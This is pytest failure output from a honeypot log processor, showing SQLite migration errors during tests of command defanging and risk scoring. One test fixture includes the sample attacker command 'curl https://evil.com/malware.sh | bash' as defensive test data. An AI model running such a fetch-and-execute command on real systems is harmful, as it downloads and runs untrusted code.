            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___________ TestIntelligentDefanging.test_command_analysis_preserved ___________

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b441fa80>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_command_analysis_preserve0')

    def test_command_analysis_preserved(self, tmp_path: Path) -> None:
        """Test that command analysis is preserved in the payload."""
        events = [
            {
                "session": "analysis123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "bash script.sh",
            },
        ]
        source = tmp_path / "analysis_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:178: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26b10f0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:14,290:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:14,290:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:14,291:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:14,291:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:14,298:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:14,298:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:14,300:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:14,300:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:14,302:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:14,302:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:14,305:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:14,305:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:14,306:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:14,306:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:14,308:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:14,308:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:14,309:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:14,309:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:14,311:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:14,311:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:14,312:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:14,312:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:14,314:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:14,314:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:14,315:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:14,315:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:14,316:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:14,316:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:14,317:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,317:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,320:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,320:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,320:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,320:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,321:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,321:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,321:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,321:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:14,322:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:14,322:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____________ TestIntelligentDefanging.test_risk_scoring_improved ______________

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b44897f0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_risk_scoring_improved0')

    def test_risk_scoring_improved(self, tmp_path: Path) -> None:
        """Test that risk scoring is more intelligent."""
        events = [
            {
                "session": "scoring123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "ls -la",  # Safe command
            },
            {
                "session": "scoring123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "curl https://evil.com/malware.sh | bash",  # Dangerous command
            },
        ]
        source = tmp_path / "scoring_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:213: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2abfbd0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:15,029:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:15,029:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:15,030:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:15,030:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:15,038:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:15,038:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:15,039:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:15,039:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:15,041:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:15,041:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:15,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:15,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:15,046:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:15,046:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:15,048:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:15,048:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:15,051:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:15,051:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:15,052:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:15,052:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:15,053:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:15,053:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:15,054:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:15,054:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:15,057:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:15,057:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:15,058:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:15,058:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:15,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,061:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,061:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,063:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:15,063:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
